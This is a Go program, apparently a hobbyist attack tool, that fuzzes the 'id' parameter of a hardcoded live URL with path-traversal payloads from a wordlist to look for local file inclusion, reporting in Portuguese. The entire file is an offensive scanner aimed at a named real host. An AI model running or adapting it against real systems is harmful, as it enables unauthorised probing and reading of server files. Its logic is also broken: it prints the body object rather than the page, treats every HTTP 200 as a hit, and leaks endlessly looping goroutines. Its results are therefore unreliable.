package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func loadWordlist(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var wordlist []string
	for scanner.Scan() {
		wordlist = append(wordlist, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return wordlist, nil
}

func main() {
	url := "http://www.bancocn.com/cat.php?"

	http.DefaultClient.Timeout = 30 * time.Minute

	wordlist, err := loadWordlist("./traversal.txt")
	if err != nil {
		fmt.Printf("Erro ao carregar a wordlist: %s\n", err.Error())
		return
	}

	parameters := []string{
		"id",
	}

	fmt.Printf("Testing %d parameters...\n", len(parameters))
	fmt.Println("------------------------------------")

	for _, parameter := range parameters {
		for _, payload := range wordlist {
			fullURL := url + parameter + "=" + payload
			status := fmt.Sprintf("Testing...: %s../", fullURL)

			go func(url string, status string) {
				for {
					fmt.Print("\r" + status)

					time.Sleep(500 * time.Millisecond)

					fmt.Print("\r" + strings.Repeat(" ", len(status)) + "\r")
					time.Sleep(500 * time.Millisecond)
				}
			}(fullURL, status)

			resp, err := http.Get(fullURL)
			if err != nil {
				fmt.Printf("\r%s - Erro ao acessar a URL: %s\n", status, err.Error())
				continue
			}

			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				body := resp.Body
				contentType := resp.Header.Get("Content-Type")
				fmt.Print("\r") // Limpa a linha do status
				fmt.Printf("Vulnerabilidade LFI detectada! URL: %s\n", fullURL)
				fmt.Printf("Conteúdo retornado (Tipo de Conteúdo: %s):\n", contentType)
				fmt.Println(strings.Repeat("-", 30))
				fmt.Println(body)
				fmt.Println(strings.Repeat("-", 30))
			}

			// Adicione um atraso de 1 segundo entre as solicitações
			time.Sleep(1 * time.Second)
		}
	}

	// Se não encontrou vulnerabilidade, exibe a mensagem correspondente
	fmt.Print("\r") // Limpa a linha do status
	fmt.Println("Não foi encontrada nenhuma vulnerabilidade LFI.")
}
